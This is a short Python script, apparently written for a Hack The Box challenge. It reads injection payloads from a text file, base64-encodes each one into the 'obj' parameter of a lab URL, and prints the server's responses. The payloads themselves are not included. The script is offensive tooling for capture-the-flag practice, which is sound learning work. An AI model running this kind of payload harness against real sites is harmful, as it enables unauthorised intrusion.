#!/usr/bin/env python
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import base64
import requests
import pathlib
import time

def injection(payload):

    url = "http://docker.hackthebox.eu:31516/index.php?obj=" #Only need to change the port

    paramEncode = base64.b64encode(payload.encode("utf-8"))
    paramDecode = paramEncode.decode("utf-8")
    send = url + str(paramDecode).replace("77u/","")
    #print("URL= " + str(send))
    result = requests.get(send)
    soup = BeautifulSoup(result.text, "html.parser")
    print(soup.body.text.strip() + "\n")

def fileValidatorAndReader():

    file = pathlib.Path("injectionTest.txt")

    if file.exists():
        with open("injectionTest.txt","r") as f:
            count = 1   

            for line in f:
                print("----- INJECTION TRY " + str(count) + " -----")
                count+=1
                print(line)
                print("----- WEB RESPONSE -----")
                injection(line) #Payload try's inside a .txt file
                time.sleep(6)
    else:
        print("File not exists") 

if __name__ == "__main__":

    fileValidatorAndReader()

    
